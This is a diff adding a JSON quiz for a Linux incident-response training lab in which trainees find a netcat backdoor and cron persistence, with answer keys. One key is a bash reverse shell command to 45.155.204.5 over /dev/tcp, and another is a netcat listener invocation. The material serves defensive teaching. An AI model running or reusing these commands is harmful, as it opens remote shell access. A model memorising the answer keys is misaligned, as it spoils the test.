@@ -1,0 +1,91 @@
+{
+    "uid": "SOC-2120",
+    "subject": "Live Incident Response Investigation - Linux",
+    "reporter": "Erin Smith",
+    "instructions": "<p>You've been assigned to remotely investigate a compromised Linux server as part of a <b>live incident response</b> scenario. The affected system has been imaged and all necessary forensic artifacts have been gathered. Your objective now is to investigate the scope of the compromise and identify any persistence mechanisms installed by the attacker.</p> <p>Use your endpoint analysis skills to conduct the investigation and answer the questions below. <b>Remember</b>, many investigative commands will need to be run with <code>sudo</code> to return comprehensive results.</p><h3>Challenge File:</h3><p><ul><li><code>~/Desktop/SOC_Level_1/Endpoint_Security/Linux/Challenge/challenge.elf</code></li></ul></p><p>To start the challenge, run <code>sudo ./challenge.elf</code> in a terminal window. Make sure to not close the program or window until after you've completed the challenge. However, you can temporarily minimize it. After running the executable, you can open additional terminal sessions to complete the investigation.</p><p>After completing the challenge, you can clean up and restore the system by terminating the <code>challenge.elf</code> process <b>(Press Ctrl + C)</b>.</p>",
+  
+  
+    "questions": [
+        {
+            "quid": "8fe3ca02",
+            "question": "Simulate the compromise by running <code>sudo ./challenge.elf</code> in a terminal window. Make sure to not close the program or window until after you've completed the challenge. However, you can temporarily minimize it. Enter \"<b>done</b>\" to continue.",
+            "type": "text_input",
+            "placeholder": "Enter \"done\" to continue",
+            "correct_answers": ["done"]
+        },
+        {
+            "quid": "bcff7494",
+            "question": "What <b>port</b> is the malware <b>listening</b> on?",
+            "type": "text_input",
+            "hint": "The <code>sudo netstat</code> command can be paired with several useful options to display network connections and listening ports (<code>-l</code>).",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["42121", "port 42121"]
+        },
+        {
+            "quid": "f8c860e0",
+            "question": "What is the <b>Process ID (PID)</b> of the malware? <i>This answer cannot be verified, but it's required for the next question(s).</i>",
+            "type": "text_input",
+            "hint": "The <code>netstat</code> command can be paired with several useful options to display network connections, listening ports, and their associated Process IDs (PIDs).",
+            "placeholder": "Enter your answer here"
+        },
+        {
+            "quid": "1c91c0b9",
+            "question": "What is the <b>name</b> of the binary or executable associated with the network listener?",
+            "type": "text_input",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["syscheck"]
+        },
+        {
+            "quid": "ddb6e729",
+            "question": "What is the <b>full path</b> of the previously identified binary?",
+            "type": "text_input",
+            "hint": "There are several ways to find the path. However, one way involves using the <code>lsof</code> command against the previously identified Process ID (PID).",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["/tmp/syscheck", "/tmp/syscheck (deleted)"]
+        },
+        {
+            "quid": "85f6cd6b",
+            "question": "Run the <code>ps</code> command against the previously identified malicious Process ID (PID). What is the full command line invocation of this binary?",
+            "type": "text_input",
+            "hint": "The <code>-F</code> argument can be used to view the output in full format.",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["/tmp/syscheck -l -p 42121"]
+        },
+        {
+            "quid": "2ed647da",
+            "question": "What is the SHA-256 hash value of the malware? <i>This answer cannot be verified due to potential version differences; however, it's a useful exercise.</i>",
+            "type": "text_input",
+            "hint": "You might have noticed that the malware was deleted immediately upon executing! However, you can still query binaries and executables held open by active processes through a specific <b>virtual filesystem</b>.",
+            "placeholder": "Enter your answer here"
+        },
+        {
+            "quid": "20787a2c",
+            "question": "Extract all <b>printable string characters</b> from the binary. Review the results for any indicators such as risky objects, descriptions, comments, banners, or usage information. Based on these findings, what <b>utility or program</b> can you identify?",
+            "type": "text_input",
+            "hint": "The <code>strings</code> command is your friend here.",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["nc", "netcat", "OpenBSD netcat"]
+        },
+        {
+            "quid": "58cbf855",
+            "question": "Examine the <b>system-wide cron jobs</b> configured on the local system. Identify any entries that may be malicious, indicating persistence mechanisms or continued compromise by the attacker. What is the <b>full file path</b> of the script that is executed?",
+            "type": "text_input",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["/bin/bash -c \"/bin/bash -i >& /dev/tcp/45.155.204.5/7183 0>&1\""]
+        },
+        {
+            "quid": "eb7cb618",
+            "question": "Use a service like <a href=\"https://crontab.guru/\" target=\"_blank\">crontab.guru</a> to interpret the cron schedule. On which specific <b>day of the week</b> does this cron entry run?",
+            "type": "text_input",
+            "placeholder": "Enter your answer here",
+            "correct_answers": ["friday", "5"]
+        },
+        {
+            "quid": "19545177",
+            "question": "Excellent work! Clean up and restore the system by terminating the <code>challenge.elf</code> process (Press Ctrl + C). Afterwards, enter \"<b>done</b>\" to continue.",
+            "type": "text_input",
+            "placeholder": "Enter \"done\" to continue",
+            "correct_answers": ["done"]
+        }
+    ]
+  }
